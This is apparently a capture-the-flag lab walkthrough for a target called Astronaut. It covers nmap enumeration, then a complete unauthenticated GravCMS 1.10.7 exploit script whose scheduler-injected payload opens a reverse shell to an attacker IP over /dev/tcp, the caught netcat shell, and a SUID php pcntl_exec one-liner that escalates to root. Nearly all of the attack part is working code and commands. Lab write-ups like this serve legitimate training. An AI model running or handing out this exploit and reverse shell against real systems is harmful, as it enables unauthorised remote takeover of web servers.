##### Tags: `cronjob`  `CVE-2021–22204`  `searchsploit`  `User-add`

# 🐧Astronaut🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.156.12 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 16:55 AEDT
Nmap scan report for 192.168.156.12
Host is up (0.25s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http        Apache httpd 2.4.41
```
The web is running Grav  
searchsploit found one python script for Arbitrary YAML Write/Update  
it doesn't require login  
https://www.exploit-db.com/exploits/49973
```
# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.156.12/grav-admin"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzMS80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)
```
change the the target and ip to get the shell back
```
$ python3 49973.py
```
```
$ nc -lvnp 4444              
listening on [any] 4444 ...
connect to [192.168.45.231] from (UNKNOWN) [192.168.156.12] 45620
bash: cannot set terminal process group (76382): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## privilege escalation  
search for SUID bit and found php
```
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/php7.4
```
From gtfobin, we can get root if php running suid bit
https://gtfobins.org/gtfobins/php/
```
php -r "pcntl_exec('/bin/bash', ['-p']);"
```
```
/usr/bin/php7.4 -r "pcntl_exec('/bin/bash', ['-p']);"
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
root
```
